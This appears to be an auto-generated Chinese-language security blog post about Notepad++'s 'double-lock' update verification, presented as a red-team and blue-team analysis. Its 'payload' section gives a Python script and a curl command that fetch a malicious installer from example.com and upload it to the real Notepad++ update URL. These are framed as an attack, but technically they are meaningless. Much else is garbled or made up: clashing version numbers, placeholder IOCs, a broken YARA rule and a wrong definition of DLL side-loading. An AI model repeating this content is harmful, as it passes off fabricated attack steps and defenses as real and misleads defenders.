---
layout: post
title:  "Notepad++ boosts update security with ‘double-lock’ mechanism"
date:   2026-02-17 18:48:27 +0000
categories: [security]
severity: high
---

# 🔥 解析 Notepad++ 雙重鎖定機制：防禦供應鏈攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `XMLDSig`, `DLL side-loading`, `cURL SSL`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Notepad++ 的更新機制中，沒有對下載的安裝程式進行充分的驗證，導致攻擊者可以透過供應鏈攻擊，下載惡意的安裝程式。
* **攻擊流程圖解**: 
    1. 攻擊者控制 Notepad++ 的更新伺服器。
    2. 攻擊者下載惡意的安裝程式到更新伺服器。
    3. 使用者更新 Notepad++ 時，會下載惡意的安裝程式。
    4. 惡意的安裝程式被執行，導致 RCE。
* **受影響元件**: Notepad++ 8.8.9 版本之前的所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要控制 Notepad++ 的更新伺服器。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載惡意的安裝程式
    url = "https://example.com/malicious_installer.exe"
    response = requests.get(url)
    
    # 將惡意的安裝程式上傳到更新伺服器
    update_server_url = "https://notepad-plus-plus.org/update"
    update_server_response = requests.post(update_server_url, files={"installer": response.content})
    
    ```
    * **範例指令**: 使用 `curl` 下載惡意的安裝程式並上傳到更新伺服器。

```

bash
curl -X POST -F "installer=@malicious_installer.exe" https://notepad-plus-plus.org/update

```
* **繞過技術**: 攻擊者可以使用 DLL side-loading 技術，將惡意的 DLL 檔案注入到 Notepad++ 的進程中。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\malicious_installer.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule NotepadPlusPlus_Malicious_Installer {
        meta:
            description = "Detects malicious Notepad++ installer"
            author = "Your Name"
        strings:
            $a = "malicious_installer.exe"
        condition:
            $a at pe.entry_point
    }
    
    ```
    * **SIEM 查詢語法** (Splunk):

    ```
    
    spl
    index=notepad_plus_plus sourcetype=update_server url="https://notepad-plus-plus.org/update" | stats count as num_requests by src_ip | where num_requests > 10
    
    ```
* **緩解措施**: 更新 Notepad++ 到 8.9.2 版本或以上，啟用雙重鎖定機制，並設定更新伺服器為官方域名。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DLL side-loading**: 想像兩個 DLL 檔案同時被載入到同一個進程中。技術上是指攻擊者可以將惡意的 DLL 檔案注入到程式的進程中，從而執行惡意的代碼。
* **XMLDSig**: XML 數字簽名是一種用於驗證 XML 文件的完整性和真實性的技術。
* **cURL SSL**: cURL 是一個用於傳輸文件的命令列工具，SSL 是一種用於加密網路通信的安全協議。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/notepad-plus-plus-boosts-update-security-with-double-lock-mechanism/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


